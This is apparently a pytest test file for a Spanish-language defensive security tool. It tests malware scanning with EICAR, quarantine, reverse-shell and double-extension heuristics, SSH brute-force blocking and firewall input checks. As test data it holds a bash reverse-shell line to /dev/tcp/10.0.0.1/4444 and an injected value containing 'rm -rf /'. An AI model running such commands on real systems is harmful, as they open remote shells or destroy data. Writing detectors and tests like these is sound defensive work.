import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from escudo.config import Config  # noqa: E402
from escudo.firewall import Firewall  # noqa: E402
from escudo.netguard import NetGuard, extract_attacker_ip  # noqa: E402
from escudo.quarantine import Quarantine  # noqa: E402
from escudo.scanner import Scanner  # noqa: E402
from escudo.signatures import EICAR  # noqa: E402


def cfg(tmp_path):
    return Config(data_dir=tmp_path / "data", exclude_dirs=[], dry_run_firewall=True)


def test_eicar_detected_and_quarantined(tmp_path):
    c = cfg(tmp_path)
    f = tmp_path / "eicar.com"
    f.write_bytes(EICAR)
    dets = Scanner(c).scan_file(str(f))
    assert dets and dets[0].name == "EICAR-Test-File" and dets[0].method == "hash"
    q = Quarantine(c.quarantine_dir)
    qid = q.add(str(f), dets[0].name)
    assert not f.exists() and EICAR not in (c.quarantine_dir / f"{qid}.bin").read_bytes()
    q.restore(qid)
    assert f.read_bytes() == EICAR


def test_heuristics_double_extension_and_reverse_shell(tmp_path):
    c = cfg(tmp_path)
    (tmp_path / "factura.pdf.exe").write_bytes(b"MZ" + b"\0" * 100)
    (tmp_path / "x.sh").write_text("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
    names = {d.name for d in Scanner(c).scan(str(tmp_path)).detections}
    assert {"Heur.DoubleExtension", "Linux.ReverseShell.DevTcp"} <= names


def test_bruteforce_blocks_ip(tmp_path):
    c = cfg(tmp_path)
    g = NetGuard(c, Firewall(c))
    line = "sshd[1]: Failed password for root from 203.0.113.7 port 2222 ssh2"
    assert extract_attacker_ip(line) == "203.0.113.7"
    for _ in range(c.bruteforce_threshold):
        g.process_log_line(line)
    assert "203.0.113.7" in g.fw.blocked


def test_whitelist_and_injection_safe(tmp_path):
    c = cfg(tmp_path)
    fw = Firewall(c)
    assert fw.block("127.0.0.1") is False
    try:
        fw.block("1.2.3.4; rm -rf /")
        raise AssertionError("debería rechazar la IP")
    except ValueError:
        pass
